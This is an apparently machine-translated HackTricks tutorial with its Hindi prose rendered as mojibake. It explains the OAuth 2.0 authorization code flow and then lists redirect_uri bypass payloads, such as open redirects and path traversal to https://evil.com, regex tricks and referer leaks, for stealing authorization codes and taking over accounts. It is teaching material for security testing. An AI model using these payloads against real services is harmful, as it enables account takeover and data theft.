# OAuth рд╕реЗ Account takeover

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА <a href="#d4a8" id="d4a8"></a>

OAuth рдХреЗ рдХреБрдЫ рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╕рдВрд╕реНрдХрд░рдг рд╣реИрдВ, рдЖрдк [https://oauth.net/2/](https://oauth.net/2/) рдкрд░ рдЬрд╛рдХрд░ рдмреБрдирд┐рдпрд╛рджреА рд╕рдордЭ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ, рд╣рдо рдЖрдЬ рдЖрдкрдХреЛ рдЬреЛ рд╕рдмрд╕реЗ рдЖрдо рдкреНрд░рд╡рд╛рд╣ рдорд┐рд▓реЗрдЧрд╛, рдЙрд╕ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░реЗрдВрдЧреЗ, рдЬреЛ рд╣реИ [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/)ред рдореВрд▓ рд░реВрдк рд╕реЗ, OAuth рдбреЗрд╡рд▓рдкрд░реНрд╕ рдХреЛ рдПрдХ **рдЕрдзрд┐рдХреГрдд рдореЗрдХреЗрдирд┐рдЬреНрдо рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЖрдкрдХреЗ рдЦрд╛рддреЗ рдХреЗ рдЦрд┐рд▓рд╛рдл рдбреЗрдЯрд╛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдпрд╛ рдХреБрдЫ рдХреНрд░рд┐рдпрд╛рдПрдВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рджреВрд╕рд░реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реЗ** (рдЕрдзрд┐рдХреГрдд рд╕рд░реНрд╡рд░)ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдорд╛рди рд▓реАрдЬрд┐рдП рд╡реЗрдмрд╕рд╛рдЗрдЯ _**https://yourtweetreader.com**_ рдореЗрдВ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рд╣реИ **рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдЧрдП рд╕рднреА рдЯреНрд╡реАрдЯреНрд╕ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреА**, рдирд┐рдЬреА рдЯреНрд╡реАрдЯреНрд╕ рд╕рд╣рд┐рддред рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, OAuth 2.0 рдХрд╛ рдкрд░рд┐рдЪрдп рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред _https://yourtweetreader.com_ рдЖрдкрд╕реЗ **рдЙрдирдХреЗ Twitter рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЖрдкрдХреЗ рд╕рднреА Tweets рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣реЗрдЧрд╛**ред рдПрдХ рд╕рд╣рдорддрд┐ рдкреГрд╖реНрда _https://twitter.com_ рдкрд░ рдкреЙрдк рдЕрдк рд╣реЛрдЧрд╛ рдЬреЛ рджрд┐рдЦрд╛рдПрдЧрд╛ рдХрд┐ **рдХреМрди рд╕реА рдЕрдиреБрдорддрд┐рдпрд╛рдВ рдорд╛рдВрдЧреА рдЬрд╛ рд░рд╣реА рд╣реИрдВ**, рдФрд░ рд╡рд┐рдХрд╛рд╕рдХрд░реНрддрд╛ рдХреМрди рд╣реИ рдЬреЛ рдЗрд╕реЗ рдорд╛рдВрдЧ рд░рд╣рд╛ рд╣реИред рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдзрд┐рдХреГрдд рдХрд░ рджреЗрддреЗ рд╣реИрдВ, _https://yourtweetreader.com_ рдЖрдкрдХреА рдУрд░ рд╕реЗ рдЖрдкрдХреЗ Tweets рддрдХ **рдкрд╣реБрдВрдЪрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рдЬрд╛рдПрдЧрд╛**ред

OAuth 2.0 рд╕рдВрджрд░реНрдн рдореЗрдВ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рддрддреНрд╡:

* **resource owner**: `resource owner` рд╡рд╣ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рд╕рдВрд╕реНрдерд╛** рд╣реИ рдЬреЛ рдЕрдкрдиреЗ рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕рдВрд╕рд╛рдзрди, рдЬреИрд╕реЗ рдХрд┐ рдЙрдирдХреЗ Twitter рдЦрд╛рддреЗ Tweets, рддрдХ рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд░рд╣рд╛ рд╣реИред рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдпрд╣ **рдЖрдк** рд╣реЛрдВрдЧреЗред
* **resource server**: `resource server` рд╡рд╣ **рд╕рд░реНрд╡рд░ рд╣реИ рдЬреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╕рдВрднрд╛рд▓рддрд╛ рд╣реИ** рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ `access token` рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж `resource owner` рдХреА рдУрд░ рд╕реЗред рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдпрд╣ **https://twitter.com** рд╣реЛрдЧрд╛ред
* **client application**: `client application` рд╡рд╣ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣реИ рдЬреЛ `resource owner` рд╕реЗ рдЕрдзрд┐рдХреГрддрд┐ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░ рд░рд╣рд╛ рд╣реИ**ред рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдпрд╣ **https://yourtweetreader.com** рд╣реЛрдЧрд╛ред
* **authorization server**: `authorization server` рд╡рд╣ **рд╕рд░реНрд╡рд░ рд╣реИ рдЬреЛ `access tokens` рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИ** `client application` рдХреЛ **рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж** `resource owner` рдХреА рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рджред рдКрдкрд░ рджрд┐рдП рдЧрдП рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдпрд╣ **https://twitter.com** рд╣реЛрдЧрд╛ред
* **client\_id**: `client_id` рд╡рд╣ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд▓рд┐рдП рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рд╣реИ**ред рдпрд╣ рдПрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ, **рдЧреИрд░-рдЧреБрдкреНрдд** рдЕрджреНрд╡рд┐рддреАрдп рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рд╣реИред
* **client\_secret:** `client_secret` рдПрдХ **рд░рд╣рд╕реНрдп рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рдЕрдзрд┐рдХреГрдд рд╕рд░реНрд╡рд░ рдХреЛ рд╣реА рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИ**ред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ `access_tokens` рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **response\_type**: `response_type` рдПрдХ рдорд╛рди рд╣реИ рдЬреЛ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рдмрддрд╛рддрд╛ рд╣реИ **рдХрд┐рд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдЯреЛрдХрди** рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рдЬреИрд╕реЗ `code`ред
* **scope**: `scope` рд╡рд╣ **рдЕрдиреБрд░реЛрдзрд┐рдд рдкрд╣реБрдВрдЪ рдХрд╛ рд╕реНрддрд░ рд╣реИ** рдЬреЛ `client application` `resource owner` рд╕реЗ рдорд╛рдВрдЧ рд░рд╣рд╛ рд╣реИред
* **redirect\_uri**: `redirect_uri` рд╡рд╣ **URL рд╣реИ рдЬрд┐рд╕ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдзрд┐рдХреГрддрд┐ рдкреВрд░реА рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдкреБрдирдГ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдЙрд╕ рдкреБрдирдГ рдирд┐рд░реНрджреЗрд╢рд┐рдд URL рд╕реЗ рдореЗрд▓ рдЦрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рдЖрдкрдиреЗ рдкрд╣рд▓реЗ рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рдкрдВрдЬреАрдХреГрдд рдХрд┐рдпрд╛ рд╣реИред
* **state**: `state` рдкреИрд░рд╛рдореАрдЯрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдзрд┐рдХреГрдд рд╕рд░реНрд╡рд░ рдХреА рдУрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдФрд░ рд╡рд╛рдкрд╕ рдЖрдиреЗ рдХреЗ рдмреАрдЪ рдбреЗрдЯрд╛ рдХреЛ рдмрдирд╛рдП рд░рдЦ рд╕рдХрддрд╛ рд╣реИ**ред рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдпрд╣ рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рдорд╛рди рд╣реЛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ **CSRF рд╕реБрд░рдХреНрд╖рд╛ рддрдВрддреНрд░** рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ рдпрджрд┐ рдпрд╣ рдкреНрд░рддрд┐ рдЕрдиреБрд░реЛрдз рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рдпрд╛ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдорд╛рди рд╣реЛрддрд╛ рд╣реИред
* **grant\_type**: `grant_type` рдкреИрд░рд╛рдореАрдЯрд░ рд╕рдордЭрд╛рддрд╛ рд╣реИ **рдХреНрдпрд╛ рдЕрдиреБрджрд╛рди рдкреНрд░рдХрд╛рд░ рд╣реИ**, рдФрд░ рдХреМрди рд╕рд╛ рдЯреЛрдХрди рд╡рд╛рдкрд╕ рдЖрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИред
* **code**: рдпрд╣ `code` рд╡рд╣ рдЕрдзрд┐рдХреГрддрд┐ рдХреЛрдб рд╣реИ рдЬреЛ `authorization server` рд╕реЗ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЗрд╕ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдХреНрд╡реЗрд░реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдкреИрд░рд╛рдореАрдЯрд░ тАЬcodeтАЭ рдореЗрдВ рд╣реЛрдЧрд╛ред рдЗрд╕ рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ `client_id` рдФрд░ `client_secret` рдХреЗ рд╕рд╛рде рдорд┐рд▓рдХрд░ `access_token` рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд▓рд╛рдЗрдВрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **access\_token**: `access_token` рд╡рд╣ **рдЯреЛрдХрди рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреНрд▓рд╛рдЗрдВрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди `resource owner` рдХреА рдУрд░ рд╕реЗ API рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИ**ред
* **refresh\_token**: `refresh_token` рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ **рдирдпрд╛ `access_token` рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдмрд┐рдирд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреНрд░реЗрд░рд┐рдд рдХрд┐рдП**ред

### рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЙрджрд╛рд╣рд░рдг

рдЗрд╕ рд╕рдм рдХреЛ рдПрдХ рд╕рд╛рде рд░рдЦрддреЗ рд╣реБрдП, рдпрд╣рд╛рдБ рдПрдХ **рд╡рд╛рд╕реНрддрд╡рд┐рдХ OAuth рдкреНрд░рд╡рд╛рд╣ рдХреИрд╕рд╛ рджрд┐рдЦрддрд╛ рд╣реИ**:

1. рдЖрдк [https://yourtweetreader.com](https://yourtweetreader.com) рдкрд░ рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ "Integrate with Twitter" рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддреЗ рд╣реИрдВред
2. [https://yourtweetreader.com](https://yourtweetreader.com) [https://twitter.com](https://twitter.com) рдХреЛ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЖрдкрд╕реЗ, рд╕рдВрд╕рд╛рдзрди рдорд╛рд▓рд┐рдХ рд╕реЗ, рдЕрдиреБрдорддрд┐ рдорд╛рдВрдЧреА рдЬрд╛рддреА рд╣реИ рдХрд┐ рдЖрдк https://yourtweetreader.com рдХреЗ Twitter рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЖрдкрдХреЗ Tweets рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рджреЗрдВред рдЕрдиреБрд░реЛрдз рдЗрд╕ рддрд░рд╣ рджрд┐рдЦреЗрдЧрд╛:
```
https://twitter.com/auth
?response_type=code
&client_id=yourtweetreader_clientId
&redirect_uri=https%3A%2F%2Fyourtweetreader.com%2Fcallback
&scope=readTweets
&state=kasodk9d1jd992k9klaskdh123
```
3\. рдЖрдкрдХреЛ рдПрдХ рд╕рд╣рдорддрд┐ рдкреГрд╖реНрда рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛:

![](https://miro.medium.com/max/1215/1\*y66EY3Fn2qn-NPI9nhZC7A.png)

4\. рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, Twitter `redirect_uri` рдкрд░ `code` рдФрд░ `state` рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рдПрдХ рдЕрдиреБрд░реЛрдз рд╡рд╛рдкрд╕ рднреЗрдЬреЗрдЧрд╛:
```
https://yourtweetreader.com?code=asd91j3jd91j92j1j9d1&state=kasodk9d1jd992k9klaskdh123
```
5\. [https://yourtweetreader.com](https://yourtweetreader.com) рддрдм рдЙрд╕ `code` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рдФрд░ рдЕрдкрдиреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ `client_id` рдФрд░ `client_secret` рдХрд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рдХреЗ, рд╕рд░реНрд╡рд░ рд╕реЗ рдЖрдкрдХреА рдУрд░ рд╕реЗ рдПрдХ `access_token` рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░реЗрдЧрд╛, рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдЙрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ рдЬрд┐рдирдХреЗ рд▓рд┐рдП рдЖрдкрдиреЗ рд╕рд╣рдорддрд┐ рджреА рдереА:
```
POST /oauth/access_token
Host: twitter.com
...{"client_id": "yourtweetreader_clientId", "client_secret": "yourtweetreader_clientSecret", "code": "asd91j3jd91j92j1j9d1", "grant_type": "authorization_code"}
```
6\. рдЕрдВрдд рдореЗрдВ, рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкреВрд░реА рд╣реЛ рдЬрд╛рддреА рд╣реИ рдФрд░ [https://yourtweetreader.com](https://yourtweetreader.com) рдЖрдкрдХреЗ `access_token` рдХреЗ рд╕рд╛рде Twitter рдХреЛ API рдХреЙрд▓ рдХрд░реЗрдЧрд╛ рддрд╛рдХрд┐ рдЖрдкрдХреЗ Tweets рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХреЗред

## рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдирд┐рд╖реНрдХрд░реНрд╖ <a href="#323a" id="323a"></a>

рдЕрдм, рджрд┐рд▓рдЪрд╕реНрдк рд╣рд┐рд╕реНрд╕рд╛! OAuth рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдореЗрдВ рдХрдИ рдЪреАрдЬреЗрдВ рдЧрд▓рдд рд╣реЛ рд╕рдХрддреА рд╣реИрдВ, рдпрд╣рд╛рдБ рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╢реНрд░реЗрдгрд┐рдпреЛрдВ рдХреЗ рдмрдЧреНрд╕ рд╣реИрдВ рдЬреЛ рдореИрдВ рдЕрдХреНрд╕рд░ рджреЗрдЦрддрд╛ рд╣реВрдБ:

### рдХрдордЬреЛрд░ redirect\_uri рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди <a href="#cc36" id="cc36"></a>

`redirect_uri` рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛, рдЬреИрд╕реЗ рдХрд┐ `code` рдЗрд╕ URL рдореЗрдВ рдЕрдзрд┐рдХреГрдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдпрджрд┐ `redirect_uri` рдХреЛ **рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╕рд░реНрд╡рд░** рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ **рдкреАрдбрд╝рд┐рдд рдХреЗ рдЦрд╛рддреЗ рдХреЛ рдЕрдкрдиреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд▓реЗ рд╕рдХрддрд╛ рд╣реИ** `code` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдФрд░ рдкреАрдбрд╝рд┐рдд рдХреЗ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдпрд╣ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рднрд┐рдиреНрди рд╣реЛрдЧрд╛ред **рдХреБрдЫ** рдХреЗрд╡рд▓ **рд╡рд╣реА `redirect_uri` рдкрде рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВрдЧреЗ рдЬреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реИ**, рд▓реЗрдХрд┐рди рдХреБрдЫ **рдХрд┐рд╕реА рднреА рдЪреАрдЬрд╝ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВрдЧреЗ** рдЬреЛ `redirect_uri` рдХреЗ рдПрдХ рд╣реА рдбреЛрдореЗрди рдпрд╛ рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╣реЛред

рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╕рдВрднрд╛рд▓реЗ рдЧрдП рддрд░реНрдХ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, `redirect_uri` рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рддрдХрдиреАрдХреЗрдВ рд╣реИрдВред рдЬрдм `redirect_uri` [https://yourtweetreader.com](https://yourtweetreader.com)/callback рд╣реЛ, рддреЛ рдЗрдирдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

* рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯреНрд╕: [`https://yourtweetreader.com`](https://yourtweetreader.com)`/callback?redirectUrl=https://evil.com`
* рдкрде рдЯреНрд░реИрд╡рд░реНрд╕рд▓: `https://yourtweetreader.com/callback/../redirect?url=https://evil.com`
* рдХрдордЬреЛрд░ `redirect_uri` regexes: `https://yourtweetreader.com.evil.com`
* HTML рдЗрдВрдЬреЗрдХреНрд╢рди рдФрд░ рд░реЗрдлрд░рд░ рд╣реЗрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЯреЛрдХрди рдЪреБрд░рд╛рдирд╛: `https://yourtweetreader.com/callback/home/attackerimg.jpg`

**рдЕрдиреНрдп рдкреИрд░рд╛рдореАрдЯрд░** рдЬреЛ рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ:

* **client\_uri** - рдХреНрд▓рд╛рдЗрдВрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╣реЛрдо рдкреЗрдЬ рдХрд╛ URL
* **policy\_uri** - URL рдЬреЛ рднрд░реЛрд╕реЗрдордВрдж рдкрд╛рд░реНрдЯреА рдХреНрд▓рд╛рдЗрдВрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЕрдВрддрд┐рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╣ рдкрдврд╝ рд╕рдХреЗ рдХрд┐ рдЙрдирдХреЗ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
* **tos\_uri** - URL рдЬреЛ рднрд░реЛрд╕реЗрдордВрдж рдкрд╛рд░реНрдЯреА рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЕрдВрддрд┐рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рднрд░реЛрд╕реЗрдордВрдж рдкрд╛рд░реНрдЯреА рдХреА рд╕реЗрд╡рд╛ рдХреА рд╢рд░реНрддреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкрдврд╝ рд╕рдХреЗред
* **initiate\_login\_uri** - URI рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ https рд╕реНрдХреАрдо рдХреЗ рд╕рд╛рде рдПрдХ рддреГрддреАрдп рдкрдХреНрд╖ RP рджреНрд╡рд╛рд░рд╛ рд▓реЙрдЧрд┐рди рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рд░реАрдбрд╛рдпрд░реЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

рдпреЗ рд╕рднреА рдкреИрд░рд╛рдореАрдЯрд░ **OAuth рдФрд░ OpenID** рд╡рд┐рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░ **рд╡реИрдХрд▓реНрдкрд┐рдХ рд╣реИрдВ** рдФрд░ рд╣рдореЗрд╢рд╛ рдПрдХ рд╡рд┐рд╢реЗрд╖ рд╕рд░реНрд╡рд░ рдкрд░ рд╕рдорд░реНрдерд┐рдд рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╣рдореЗрд╢рд╛ рдЬрд╛рдВрдЪрдиреЗ рд▓рд╛рдпрдХ рд╣реИ рдХрд┐ рдЖрдкрдХреЗ рд╕рд░реНрд╡рд░ рдкрд░ рдХреМрди рд╕реЗ рдкреИрд░рд╛рдореАрдЯрд░ рд╕рдорд░реНрдерд┐рдд рд╣реИрдВред

